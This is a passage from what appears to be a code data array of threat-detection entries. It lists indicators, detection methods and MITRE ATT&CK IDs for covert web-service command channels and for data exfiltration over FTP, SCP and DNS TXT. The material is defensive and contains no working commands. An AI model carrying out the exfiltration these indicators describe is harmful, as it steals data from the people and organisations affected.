      "Extremely symmetric connection intervals Destined to unregistered external IP coordinates",
      "Minimal variance indicators in packet size distribution patterns on specific routes over hours"
    ],
    detectionMethods: "Analyze outbound session schedules with AI entropy models, check URL safety lists for remote target coordinates, review host memory for anomalous agents.",
    mitre: "T1102 - Web Service"
  },
  {
    attack: "Critical Data Exfiltration",
    description: "Unauthorized transfer of sensitive internal database files or archives outside network borders by attacker agents.",
    indicators: [
      "Massive transfer sizes in outbound parameters over brief duration channels",
      "Utilization of unauthorized transport layers (FTP, SCP, DNS TXT fields) destining outward",
      "Atypical data retrieval operations completed on SQL schema databases"
    ],
    detectionMethods: "Set throughput alert limits, quarantine outgoing data pipes showing extreme volumes, inspect file transfer protocol details in transit.",
    mitre: "T1048 - Exfiltration Over Alternative Protocol"
  }
];
